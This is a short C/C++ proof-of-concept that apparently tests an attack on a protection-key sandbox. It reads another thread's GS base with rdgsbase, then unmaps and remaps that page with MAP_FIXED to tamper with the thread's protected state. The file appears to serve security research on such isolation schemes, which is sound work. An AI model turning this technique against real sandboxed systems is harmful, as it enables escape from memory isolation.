#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <syscall.h>
#include <pthread.h>
#include <setjmp.h>
#include <atomic>
#include <thread>
#include <iostream>

#include "_libattack.h"

char* rdgsbase(){
    char* ret;
    asm("rdgsbase %[ret]\n"
        :[ret]"=r"(ret)
        :"c"(0)
        :"rax", "rdx");
    return ret;
}

volatile char* gs = 0;
volatile int flag = 0;

void* second_thread(void* arg){
    int res = pkey_mprotect(0, 4096, PROT_READ|PROT_WRITE, 1);
    printf("res = %d\n", res);
    gs = rdgsbase();

    while(flag == 0);

    res = syscall(__NR_exit_group);
    return NULL;
}

int main(int argc, char **argv) {
    pthread_t t1;
    int res = pthread_create(&t1, nullptr, second_thread, NULL);

    while(gs == 0){
        printf("gs= %d\n", gs);
    }

    int ures = munmap((char*)gs, 4096);
    printf("ures %d\n", ures);
    
    void* mres = mmap((char*)gs, 4096, PROT_READ|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    printf("mres %p\n", mres);

    flag = 1;
    while(true);
    return 0;
}